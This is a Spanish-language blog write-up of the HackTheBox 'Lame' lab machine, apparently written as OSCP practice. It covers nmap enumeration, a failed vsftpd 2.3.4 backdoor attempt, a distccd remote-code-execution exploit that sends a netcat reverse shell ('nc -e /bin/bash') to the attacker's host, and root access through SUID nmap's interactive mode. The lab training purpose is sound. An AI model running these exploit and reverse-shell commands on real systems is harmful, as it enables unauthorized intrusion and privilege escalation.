---
layout: post
title: Hackthebox Lame - OSCP
category: htb,oscp,hackthebox
permalink: "blog/lame"
published: yes
---

Este post de la máquina Lame sera una intrusión utilizando metasploit y `sin metasploit`


# Enumeración

Primeramente  tenemos que  comprobar que la máquina este activa y para esto lanzaremos un ping a a  la máquina `ping -c 10.10.10.3`.

```console
root@rebcesp:/home/rebcesp/htb# ping -c 1 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=38.7 ms

--- 10.10.10.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.732/38.732/38.732/0.000 ms
```
Podemos ver que el ttl=63 pertenece a una máquina linux, podemos guiarnos a través de esta  tabla:

<img class="differentSize70" src="/assets/img/ttlTabla.png" alt="Foto1" style="margin:auto; display:block;">

Vamos a proceder a enumerar los puertos `TCP`, utilizando la siguiente sintaxis de nmap:
`nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn -n 10.10.10.3`

```console
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63
```

Ya que tenemos los puertos, vamos a buscar las versiones de cada uno de ellos y analizarlos para ver si alguno es explotable, lo guardaremos en formato nmap con el parametro -oN targeted para después trabajar con expresiones regulares.

`nmap -sC -sV -p21,22,139,445,3632 -oN targeted` 

```console
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h57m03s, deviation: 2h49m45s, median: -3d02h57m06s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-05-07T04:04:28-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```
## Expresión regular -oN targetd

```console
root@rebcesp:/home/rebcesp/htb/Lame/nmap# cat targeted | grep -oP '\d{1,5}/tcp.*'
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```



Intentaremos acceder por el protocolo FTP que se encuentra en el puerto 21, y nos detalla que el acceso al login es `Anonymous`, esto significa que no requiere de contraseña, pero al acceder no encontramos ningun directorio es decir esta `vacío`, entonces lo descartamos y continuamos analizando los siguientes puertos.

EL comando utilizado sería este

```console
root@rebcesp:/home/rebcesp/htb/Lame/nmap# ftp 10.10.10.3 
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:rebcesp): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```
No nos olvidemos que puerto 21/tcp FTP tiene la version `vsftpd 2.3.4` buscaremos algun exploit para acceder manualmente sin usar `metasploit`. Lo buscamos rápidamente con searchsploit

```console
root@rebcesp:/home/rebcesp/htb/Lame/nmap# searchsploit vsftpd 2.3.4
--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                 |  Path
                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)         | exploits/unix/remote/17491.rb
--------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
Buscamos un exploit en algun repositorio de github y encontramos algunos de ellos que utilizamos , la  vulnerabilidad de esta versión se basa en una `sonrisa :)` si lees el código del exploit podras darte cuenta que se intenta aunteticar con una carita feliz. De todos modos al lanzar el exploit al target no funciona.
Se queda pensando...

```console
root@rebcesp:/home/rebcesp/htb/Lame/exploits# python3 vsftpd_234_exploit.py 10.10.10.3 21 whoami
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
```
Al comprobar que no podemos acceder  por el puerto 21 con el exploit utilizado, probaremos con el puerto 3632, que esta utilizando un servicio distccd:

> Distcc es un programa diseñado para distribuir tareas de compilación a través de la red hacia máquinas participantes. Consiste en un servidor, distccd y un programa cliente, distcc. Distcc puede trabajar de forma transparente con ccache, Portage y Automake realizando una sencilla configuración. 

Vamos a usar la misma  metodología buscando en `searchsploit` algún exploit para  distccd y luego proceder a buscarlo el exploit en algun repositorio de  github u otra plataforma.

```console
root@rebcesp:/home/rebcesp/htb/Lame/exploits# searchsploit distcc
--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                 |  Path
                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------- ----------------------------------------
DistCC Daemon - Command Execution (Metasploit)                 | exploits/multiple/remote/9915.rb
--------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
Encontramos el exploit en python `distccd_rce_CVE-2004-2687.py`.

Si ejecutamos comandos arbitrarios por ejemplo `ifconfig` comprobamos que estamos en la máquina Lame pero con usuario de deamon, para  saber esto podrías ejecutar en vez de ifconfig `whoami`.

Al saber eso, utilizamos netcat para tener una reverse shell, dejamos en escucha y ejecutamos el exploit enviando nuestra bash al nc.

```
root@rebcesp:/home/rebcesp/htb/Lame/exploits# python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'nohup nc -e /bin/bash 10.10.14.13 443 & '
```
* nohup: es un comando muy importante, lo ponemos para no perder la sesión y que se mantenga en segundo plano trabajando.
Una explicación mas detallada: Nohup es un comando complementario que le dice al sistema Linux que no detenga otro comando una vez que haya comenzado. Eso significa que seguirá funcionando hasta que se complete, incluso si el usuario que lo inició cierra la sesión. La sintaxis para Nohup es simple y se ve así:

```
root@rebcesp:/home/rebcesp# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.3] 48791
whoami
daemon
scirpt /dev/null -c bash
daemon@lame:/tmp$ 
```
Buscamos la flag con el comando:
```console
daemon@lame:/home$ find \-name user.txt 2>/dev/null
./makis/user.txt
```
Aquí ya tenemos la flag del user.txt, en esta misma sesión podemos  ir a ver si tenemos suerte con la de `root` pero vemos que no tenemos permiso, por lo tanto listamos permisos SUID a ver si hay alguno que nos pueda servir.

```console
daemon@lame:/$ find \-perm -4000 2>/dev/null
./bin/umount
./bin/fusermount
./bin/su
./bin/mount
./bin/ping
./bin/ping6
./sbin/mount.nfs
./lib/dhcp3-client/call-dhclient-script
./usr/bin/sudoedit
./usr/bin/X
./usr/bin/netkit-rsh
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/sudo
./usr/bin/netkit-rlogin
./usr/bin/arping
./usr/bin/at
./usr/bin/newgrp
./usr/bin/chfn
./usr/bin/nmap
./usr/bin/chsh
./usr/bin/netkit-rcp
./usr/bin/passwd
./usr/bin/mtr
./usr/sbin/uuidd
./usr/sbin/pppd
./usr/lib/telnetlogin
./usr/lib/apache2/suexec
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/pt_chown
```
Podemos ver que nmap es SUID , esto nos puede ayudar mucho a escalar  privilegios, podemos comprobarlo haciendo un: `which nmap | xargs ls -l`

```console
daemon@lame:/$ which nmap | xargs ls -l
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
```
Esto quiere decir que a nivel de sistema cualquier usuario puede ejecutar este binario de forma temporal como el usuario root, esto significa que podremos tener una reverse shell a la hora de ejecutarlo. Esto se podría hacer con el modo interactivo de nmap.

Procedemos a  escribir: nmap --interactive
!sh
root;)





